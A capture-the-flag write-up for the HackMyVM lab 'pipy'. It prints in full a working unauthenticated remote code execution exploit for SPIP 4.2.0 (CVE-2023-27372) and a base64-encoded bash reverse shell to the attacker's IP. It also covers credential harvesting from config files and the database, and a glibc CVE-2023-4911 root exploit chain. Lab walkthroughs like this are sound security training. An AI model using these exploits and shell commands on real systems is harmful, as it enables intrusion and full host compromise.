# pipy

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| pipy | ruycr4ft | Beginner | HackMyVM |

**Summary:** The compromise started from exposed SPIP 4.2.0 on the public web service, where the password recovery workflow accepted crafted serialized input in the `oubli` parameter and enabled unauthenticated command execution through CVE-2023-27372. After obtaining code execution as `www-data`, local application files revealed database credentials inside `connect.php`, which allowed direct access to MariaDB and extraction of account data from `spip_auteurs`, including the credential material used to access the `angela` SSH account. Once inside the host as a real user, system profiling confirmed Ubuntu 22.04 with glibc 2.35, matching the vulnerable condition for CVE-2023-4911. A local exploit build and execution chain then abused the glibc tunables weakness to obtain a root shell, completing the path from unauthenticated web entry point to full system takeover and retrieval of both user and root flags.

---

## Recon

1. I started with host discovery from the attack workstation and identified the target at `192.168.100.174`.

```powershell
PS C:\Windows\System32> cd D:
PS D:\> D:\CTF_Tools\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.174 08:00:27:EB:3C:05 VirtualBox
```

2. I performed a full TCP scan with default scripts and version detection, which exposed SSH and Apache with SPIP.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pipy]
└─$ nmap -sC -sV -p- 192.168.100.174
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-01 01:39 WIB
Nmap scan report for 192.168.100.174
Host is up (0.0039s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 c0:f6:a1:6a:53:72:be:8d:c2:34:11:e7:e4:9c:94:75 (ECDSA)
|_  256 32:1c:f5:df:16:c7:c1:99:2c:d6:26:93:5a:43:57:59 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Mi sitio SPIP
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-generator: SPIP 4.2.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.82 seconds
```

3. I validated the web surface on port 80 and captured the page state below.

![](image.png)

4. I searched for public exploit material against the detected SPIP version and pulled CVE-2023-27372 exploit code.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pipy]
└─$ searchsploit spip
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
SPIP - 'connect' PHP Injection (Metasploit)                                           | php/remote/27941.rb
SPIP 1.8.2 - 'Spip_RSS.php' Remote Command Execution                                  | php/webapps/27172.txt
SPIP 1.8.2g - Remote Command Execution                                                | php/webapps/1482.php
SPIP 1.8.3 - 'Spip_login.php' Remote File Inclusion                                   | php/webapps/27589.txt
SPIP 1.8/1.9 - 'index.php3' Cross-Site Scripting                                      | php/webapps/27158.txt
SPIP 1.8/1.9 - Multiple SQL Injections                                                | php/webapps/27157.txt
SPIP 2.1 - 'var_login' Cross-Site Scripting                                           | php/webapps/34388.txt
SPIP 2.x - Multiple Cross-Site Scripting Vulnerabilities                              | php/webapps/37397.html
SPIP 3.1.1/3.1.2 - File Enumeration / Path Traversal                                  | php/webapps/40596.txt
SPIP 3.1.2 - Cross-Site Request Forgery                                               | php/webapps/40597.txt
SPIP 3.1.2 Template Compiler/Composer - PHP Code Execution                            | php/webapps/40595.txt
SPIP < 2.0.9 - Arbitrary Copy All Passwords to '.XML' File                            | php/webapps/9448.py
SPIP CMS < 2.0.23/ 2.1.22/3.0.9 - Privilege Escalation                                | php/webapps/33425.py
spip v4.1.10 - Spoofing Admin account                                                 | php/webapps/51557.txt
SPIP v4.2.0 - Remote Code Execution (Unauthenticated)                                 | php/webapps/51536.py
-------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pipy]
└─$ searchsploit -m php/webapps/51536.py
  Exploit: SPIP v4.2.0 - Remote Code Execution (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/51536
     Path: /usr/share/exploitdb/exploits/php/webapps/51536.py
    Codes: CVE-2023-27372
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /tmp/pipy/51536.py
```

5. The exploit needed a local compatibility adjustment, so I disabled the default cipher lines and kept the script as follows.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pipy]
└─$ vim 51536.py

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pipy]
└─$ cat 51536.py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Exploit Title: SPIP v4.2.1 - Remote Code Execution (Unauthenticated)
# Google Dork: inurl:"/spip.php?page=login"
# Date: 19/06/2023
# Exploit Author: nuts7 (https://github.com/nuts7/CVE-2023-27372)
# Vendor Homepage: https://www.spip.net/
# Software Link: https://files.spip.net/spip/archives/
# Version: < 4.2.1 (Except few fixed versions indicated in the description)
# Tested on: Ubuntu 20.04.3 LTS, SPIP 4.0.0
# CVE reference : CVE-2023-27372 (coiffeur)
# CVSS : 9.8 (Critical)
#
# Vulnerability Description:
#
# SPIP before 4.2.1 allows Remote Code Execution via form values in the public area because serialization is mishandled. Branches 3.2, 4.0, 4.1 and 4.2 are concerned. The fixed versions are 3.2.18, 4.0.10, 4.1.8, and 4.2.1.
# This PoC exploits a PHP code injection in SPIP. The vulnerability exists in the `oubli` parameter and allows an unauthenticated user to execute arbitrary commands with web user privileges.
#
# Usage: python3 CVE-2023-27372.py http://example.com

import argparse
import bs4
import html
import requests

def parseArgs():
    parser = argparse.ArgumentParser(description="Poc of CVE-2023-27372 SPIP < 4.2.1 - Remote Code Execution by nuts7")
    parser.add_argument("-u", "--url", default=None, required=True, help="SPIP application base URL")
    parser.add_argument("-c", "--command", default=None, required=True, help="Command to execute")
    parser.add_argument("-v", "--verbose", default=False, action="store_true", help="Verbose mode. (default: False)")
    return parser.parse_args()

def get_anticsrf(url):
    r = requests.get('%s/spip.php?page=spip_pass' % url, timeout=10)
    soup = bs4.BeautifulSoup(r.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'formulaire_action_args'})
    if csrf_input:
        csrf_value = csrf_input['value']
        if options.verbose:
            print("[+] Anti-CSRF token found : %s" % csrf_value)
        return csrf_value
    else:
        print("[-] Unable to find Anti-CSRF token")
        return -1

def send_payload(url, payload):
    data = {
        "page": "spip_pass",
        "formulaire_action": "oubli",
        "formulaire_action_args": csrf,
        "oubli": payload
    }
    r = requests.post('%s/spip.php?page=spip_pass' % url, data=data)
    if options.verbose:
        print("[+] Execute this payload : %s" % payload)
    return 0

if __name__ == '__main__':
    options = parseArgs()

    requests.packages.urllib3.disable_warnings()
#    requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
#    try:
#        requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
#    except AttributeError:
#        pass

    csrf = get_anticsrf(url=options.url)
    send_payload(url=options.url, payload="s:%s:\"<?php system('%s'); ?>\";" % (20 + len(options.command), options.command))
```

## Initial Access

1. I encoded a reverse shell payload, started a listener, then triggered command execution through the SPIP exploit.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pipy]
└─$ echo "bash -i >& /dev/tcp/192.168.100.1/4444 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xLzQ0NDQgMD4mMQo=
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pipy]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pipy]
└─$ python3 51536.py -u http://192.168.100.174 -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xLzQ0NDQgMD4mMQo= | base64 -d | bash"
```

```bash
connect to [172.20.131.21] from (UNKNOWN) [172.20.128.1] 58142
bash: cannot set terminal process group (840): Inappropriate ioctl for device
bash: no job control in this shell
www-data@pipy:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@pipy:/var/www/html$ which python3
which python3
/usr/bin/python3
www-data@pipy:/var/www/html$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@pipy:/var/www/html$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pipy]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@pipy:/var/www/html$ export SHELL=/bin/bash
www-data@pipy:/var/www/html$ export TERM=xterm
www-data@pipy:/var/www/html$ stty rows 90 cols 135
```

2. From the foothold, I confirmed local users and read SPIP configuration to recover database credentials, then queried author records.

```bash
www-data@pipy:/var/www/html$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
angela:x:1000:1000:Angela:/home/angela:/bin/bash
www-data@pipy:/var/www/html$ ls -la /home
total 12
drwxr-xr-x  3 root   root   4096 Oct  4  2023 .
drwxr-xr-x 19 root   root   4096 Oct  2  2023 ..
drwxr-x---  6 angela angela 4096 Oct 17  2023 angela
```

```bash
www-data@pipy:/var/www/html/config$ cat connect.php
<?php
if (!defined("_ECRIRE_INC_VERSION")) return;
defined('_MYSQL_SET_SQL_MODE') || define('_MYSQL_SET_SQL_MODE',true);
$GLOBALS['spip_connect_version'] = 0.8;
spip_connect_db('localhost','','root','dbpassword','spip','mysql', 'spip','','');
```

```bash
www-data@pipy:/var/www/html/config$ mysql -u root -pdbpassword spip
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 81
Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [spip]> show tables;
+-------------------------+
| Tables_in_spip          |
+-------------------------+
| spip_articles           |
| spip_auteurs            |
| spip_auteurs_liens      |
| spip_depots             |
| spip_depots_plugins     |
| spip_documents          |
| spip_documents_liens    |
| spip_forum              |
| spip_groupes_mots       |
| spip_jobs               |
| spip_jobs_liens         |
| spip_meta               |
| spip_mots               |
| spip_mots_liens         |
| spip_paquets            |
| spip_plugins            |
| spip_referers           |
| spip_referers_articles  |
| spip_resultats          |
| spip_rubriques          |
| spip_syndic             |
| spip_syndic_articles    |
| spip_types_documents    |
| spip_urls               |
| spip_versions           |
| spip_versions_fragments |
| spip_visites            |
| spip_visites_articles   |
+-------------------------+
28 rows in set (0.000 sec)

MariaDB [spip]> SELECT nom, login, pass, email FROM spip_auteurs;
+--------+--------+--------------------------------------------------------------+-----------------+
| nom    | login  | pass                                                         | email           |
+--------+--------+--------------------------------------------------------------+-----------------+
| Angela | angela | 4[REDACTED]                                                  | angela@pipy.htb |
| admin  | admin  | $2y$10$.GR/i2bwnVInUmzdzSi10u66AKUUWGGDBNnA7IuIeZBZVtFMqTsZ2 | admin@pipy.htb  |
+--------+--------+--------------------------------------------------------------+-----------------+
```

3. I used the recovered credential path to authenticate over SSH as `angela` and confirmed user level access plus the user flag location.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pipy]
└─$ ssh angela@192.168.100.174
The authenticity of host '192.168.100.174 (192.168.100.174)' can't be established.
ED25519 key fingerprint is: SHA256:aScYbZLUuamn6QKwvYnkrP4X2B6mlgWD8lyjuNH/dSc
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.174' (ED25519) to the list of known hosts.
angela@192.168.100.174's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-84-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Apr 30 07:10:55 PM UTC 2026

  System load:  0.11328125        Processes:               122
  Usage of /:   69.4% of 8.02GB   Users logged in:         0
  Memory usage: 21%               IPv4 address for enp0s3: 192.168.100.174
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

23 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Oct  5 14:13:59 2023 from 192.168.0.130
angela@pipy:~$ id
uid=1000(angela) gid=1000(angela) groups=1000(angela)
angela@pipy:~$ ls -la
total 40
drwxr-x--- 6 angela angela 4096 Oct 17  2023 .
drwxr-xr-x 3 root   root   4096 Oct  4  2023 ..
lrwxrwxrwx 1 angela angela    9 Oct 17  2023 .bash_history -> /dev/null
-rw-r--r-- 1 angela angela  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 angela angela 3771 Jan  6  2022 .bashrc
drwx------ 3 angela angela 4096 Oct  5  2023 .cache
drwxrwxr-x 3 angela angela 4096 Oct  3  2023 .local
-rw-r--r-- 1 angela angela  807 Jan  6  2022 .profile
drwx------ 3 angela angela 4096 Oct  3  2023 snap
drwx------ 2 angela angela 4096 Oct  2  2023 .ssh
-rw-r--r-- 1 angela angela    0 Oct  2  2023 .sudo_as_admin_successful
-rw------- 1 angela angela   33 Oct  5  2023 user.txt
```

## PrivEsc

1. Local enumeration showed vulnerable glibc, and the tunables crash test confirmed the target condition for CVE-2023-4911. The references used for this CVE were <https://github.com/leesh3288/CVE-2023-4911> and <https://seclists.org/oss-sec/2023/q4/18>.

```bash
angela@pipy:~$ lsb_release -rs
22.04
angela@pipy:~$ getconf GNU_LIBC_VERSION
glibc 2.35
angela@pipy:~$ env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" "Z=`printf '%08192x' 1`" /usr/bin/su --help
Segmentation fault (core dumped)
```

2. I compiled and executed the public exploit chain, then obtained a root shell.

```bash
angela@pipy:~$ mkdir /tmp/CVE-2023-4911
angela@pipy:~$ cd /tmp/CVE-2023-4911/
angela@pipy:/tmp/CVE-2023-4911$ nano gen_libc.py
angela@pipy:/tmp/CVE-2023-4911$ nano exp.c
angela@pipy:/tmp/CVE-2023-4911$ nano Makefile
angela@pipy:/tmp/CVE-2023-4911$ make
gcc -o exp exp.c
python3 gen_libc.py
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/angela/.cache/.pwntools-cache-3.10/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[!] An issue occurred while checking PyPI
[*] You have the latest version of Pwntools (4.11.0)
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
./exp
try 100
try 200
try 300
# id
uid=0(root) gid=0(root) groups=0(root),1000(angela)
# whoami
root
# hostname
pipy
```

3. With root access established, I read both flags.

```bash
# cat /home/angela/user.txt
dab[REDACTED]
# cat /root/root.txt
ab5[REDACTED]
```

---

## Attack Chain Summary

1. **Reconnaissance**: Network discovery and full service fingerprinting identified SSH and a SPIP 4.2.0 web application on Apache.
2. **Vulnerability Discovery**: Public exploit intelligence mapped SPIP 4.2.0 to CVE-2023-27372, then local script adjustment made the exploit reliable in the attacker environment.
3. **Exploitation**: Crafted `oubli` payload delivery through `spip_pass` executed a reverse shell as `www-data`, providing stable interactive command execution on the target.
4. **Internal Enumeration**: Application configuration exposed database credentials, MariaDB access revealed account credential material, and SSH login as `angela` transitioned from web context to user context.
5. **Privilege Escalation**: Host version checks confirmed glibc 2.35, CVE-2023-4911 exploitation produced root privileges, and final flag extraction completed full compromise.
